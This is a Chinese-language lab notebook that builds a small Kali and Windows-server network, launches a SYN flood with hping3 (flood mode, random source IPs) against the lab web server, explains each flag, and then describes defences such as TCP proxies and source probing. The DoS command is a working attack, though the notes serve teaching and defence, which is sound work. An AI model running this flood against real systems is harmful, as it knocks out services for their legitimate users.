实验：

- 环境：

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230812185458197.png" alt="image-20230812185458197" style="zoom:200%;" />

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230812192945392.png" alt="image-20230812192945392" style="zoom:200%;" />

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230812193007499.png" alt="image-20230812193007499" style="zoom:200%;" />

进入kali之后如图操作

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230812193104682.png" alt="image-20230812193104682" style="zoom:200%;" />

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230812194811142.png" alt="image-20230812194811142" style="zoom:200%;" />

```
service apache2 start
vim /etc/network/interface
```

```
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
address 192.168.1.50
netmask 255.255.255.0
gateway 192.168.1.254
```

然后重启一下网卡，以下命令：

```
ifdown eth0
ifip eth0
```

查看一下路由表

```
route -n
```

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230812200652561.png" alt="image-20230812200652561" style="zoom:200%;" />

然后进入server

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230812200757073.png" alt="image-20230812200757073" style="zoom:200%;" />

```
netsh interface ip set address "Ethernet0" static 192.168.2.100 255.255.255.0 192.168.2.254
```

服务器搭网站

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230812210323246.png" alt="image-20230812210323246" style="zoom:200%;" />

然后一直下一步安装就好了

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230812210432917.png" alt="image-20230812210432917" style="zoom:200%;" />

可以在这里进来查看

然后就可以开始使用hping3进行DOS攻击

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230812211133751.png" alt="image-20230812211133751" style="zoom:200%;" />

```
hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.2.100

#-c  表示每次攻击发送数据包的数量
#-d  表示每个数据包的大小
#-S  只发送SYN的包
#-w  窗口大小
#-p  目标端口
#--flood 执行flood洪水攻击
#--rand-source  表示使用随机IP对服务器及逆行攻击
```

防御方法：

- 使用TCP代理

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230812222549849.png" alt="image-20230812222549849" style="zoom:200%;" />

- TCP源探测

  防火墙会对client发送的SYN请求进行拦截，然后发送一个伪造的SYN和ACK，如果客户机是虚假的源就不会确认，就防止了，但是如果客户机是真实存在的，那么会发现这个伪造的和自己的请求是对不上的，于是那么这个时候就会发送请求重新建立连接RST，然后防火墙也知道说明客户机是真实的，于是就将RST放通，去访问请求服务器
